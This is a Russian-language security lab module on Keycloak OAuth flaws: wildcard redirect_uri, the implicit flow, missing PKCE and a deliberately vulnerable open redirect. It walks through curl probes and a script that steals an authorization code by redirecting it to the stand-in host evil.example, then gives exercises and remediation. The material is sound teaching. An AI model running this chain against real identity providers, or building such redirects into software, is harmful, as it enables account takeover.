# Модуль 03 — Flows, redirect_uri / open redirect, утечка кода

**Цель:** показать, как слабая валидация `redirect_uri` + открытый редирект на стороне
клиента приводят к перехвату authorization code (account takeover), и почему важен PKCE.

---

## 1. Теория

### 1.1 Authorization Code Flow

```
клиент ──▶ /auth?client_id&redirect_uri&response_type=code ──▶ Keycloak
Keycloak: логин (+ OTP) ──▶ 302 redirect_uri?code=...        ──▶ клиент
клиент  ──▶ /token (code + client_secret)                    ──▶ доступ-токен
```

Уязвимости фокусируются на шаге передачи `code`: если его можно увести на чужой адрес/путь,
атакующий обменяет его на токен.

### 1.2 Валидация `redirect_uri`

Keycloak сверяет `redirect_uri` с `Valid Redirect URIs` клиента. Опасные конфигурации:

- **wildcard-префикс** `https://app.com/*` — разрешает любой путь, в т.ч. чужой;
- `*` целиком — разрешает всё;
- широкий `webOrigins` / CORS `*`.

Если `redirect_uri` можно направить на URL, где есть **open redirect**, `code` попадёт
во внешний домен атакующего. Без PKCE перехваченный `code` можно обменять на токен.

### 1.3 Implicit flow

`response_type=token` возвращает access-токен прямо в URL-fragment. Токен утекает через
историю браузера, `Referer`, логи прокси. Считается deprecated, но часто остаётся включён.

### 1.4 PKCE

PKCE (`code_challenge`/`code_verifier`) привязывает `code` к инициатору. Без него
interception-атака (в т.ч. на мобильных с кастомными схемами) реализуема.

---

## 2. Что настроено в лабе

- `sp-app`: confidential, `standardFlowEnabled`, **`implicitFlowEnabled: true`**,
  `redirectUris: ["http://app.127.0.0.1.nip.io:8088/*"]` (wildcard), `webOrigins: ["*"]`;
- `public-spa`: public-клиент **без PKCE**, wildcard redirect, implicit;
- у `sp-app` есть намеренно «дырявый» редирект `/go?to=<url>` — шаг эксфильтрации.

---

## 3. Практика (проверенные результаты)

### 3.1 Слабая валидация redirect_uri

```bash
BASE=http://keycloak.127.0.0.1.nip.io:8080
for RU in \
  'http://app.127.0.0.1.nip.io:8088/callback' \
  'http://app.127.0.0.1.nip.io:8088/anything/evil' \
  'http://app.127.0.0.1.nip.io:8088/go?to=https://evil.example' \
  'http://evil.example/cb'; do
  curl -s -G "$BASE/realms/vulnerable/protocol/openid-connect/auth" \
    --data-urlencode "client_id=sp-app" --data-urlencode "response_type=code" \
    --data-urlencode "scope=openid" --data-urlencode "redirect_uri=$RU" \
    | grep -qi 'invalid parameter: redirect_uri' && echo "$RU -> REJECTED" || echo "$RU -> ACCEPTED"
done
```

| redirect_uri | Результат | Вывод |
|---|---|---|
| `.../callback` | ACCEPTED | легитимный |
| `.../anything/evil` | **ACCEPTED** | wildcard разрешает любой путь |
| `.../go?to=https://evil.example` | **ACCEPTED** | можно подставить чужой URL в параметр |
| `http://evil.example/cb` | REJECTED | чужой домен отсекается |

### 3.2 Implicit flow включён

```bash
curl -s -o /dev/null -w '%{http_code}\n' -G "$BASE/realms/vulnerable/protocol/openid-connect/auth" \
  --data-urlencode "client_id=sp-app" --data-urlencode "response_type=token" \
  --data-urlencode "scope=openid" --data-urlencode "redirect_uri=http://app.127.0.0.1.nip.io:8088/callback"
# 200 (страница логина — поток принимается)
```

### 3.3 Open redirect на стороне клиента

```bash
curl -s -o /dev/null -w '%{redirect_url}\n' 'http://app.127.0.0.1.nip.io:8088/go?to=https://evil.example/steal'
# https://evil.example/steal
```

### 3.4 Полная цепочка: перехват authorization code

`login_flow.py` проходит логин (пароль + OTP) и фиксирует итоговый redirect:

```bash
python3 scripts/login_flow.py --client-id public-spa \
  --redirect-uri 'http://app.127.0.0.1.nip.io:8088/go?to=https://evil.example/steal'
```

```
[*] final redirect URL:
    http://app.127.0.0.1.nip.io:8088/go?to=https://evil.example/steal&state=st&
    session_state=1d54256c-...&iss=...&code=4401d5b4-3db2-470e-aa3d-e6abbca75164...
    code = 4401d5b4-3db2-470e-aa3d-e6abbca75164...
```

Keycloak отдал `code` в наш крафтовый `redirect_uri`; `/go` тут же редиректит на
`https://evil.example/steal` **вместе с `code`** → code украден. Без PKCE его можно
обменять на токен.

### Проверенная таблица

| Проверка | Результат | Вывод |
|---|---|---|
| wildcard разрешает чужой путь | ACCEPTED | избыточный redirect_uri |
| чужой домен | REJECTED | базовая защита есть |
| implicit (`response_type=token`) | принимается | утечка токена через fragment |
| `/go?to=` | редирект на внешний домен | open redirect на клиенте |
| полная цепочка | `code` ушёл на `evil.example` | перехват кода |

> Замечание: Keycloak 26 **не даёт повторно использовать один и тот же OTP-код** в пределах
> окна (anti-replay). Поэтому повторные прогоны `login_flow.py` подряд нужно разнести по
> времени (или менять пользователя) — иначе OTP-шаг не пройдёт.

---

## 4. Упражнения

| # | Что сделать | На что смотреть |
|---|---|---|
| 1 | Сузить `redirect_uris` до точного и повторить | какой запрос начнёт отклоняться |
| 2 | Убрать `/go` и повторить цепочку | почему без open redirect атака сложнее |
| 3 | Включить PKCE на `public-spa` | как PKCE ломает перехват кода |
| 4 | Сравнить `vulnerable` и `production` (PKCE: S256, точный redirect) | как выглядит корректная настройка |
| 5 | Попробовать обменять перехваченный `code` на токен | что нужно (client_secret / PKCE) |

---

## 5. Ремедиация

- Точные `redirect_uris` (без `*`), никаких wildcard-префиксов.
- **Обязательный PKCE** для public-клиентов (`S256`), а лучше — для всех.
- Отключить implicit flow.
- Убрать open redirect в клиенте; валидировать `to`/`return_url` по allowlist.
- Ограничить `webOrigins` точностями доменами.
- Короткое время жизни `code`, одноразовость, проверка `state`.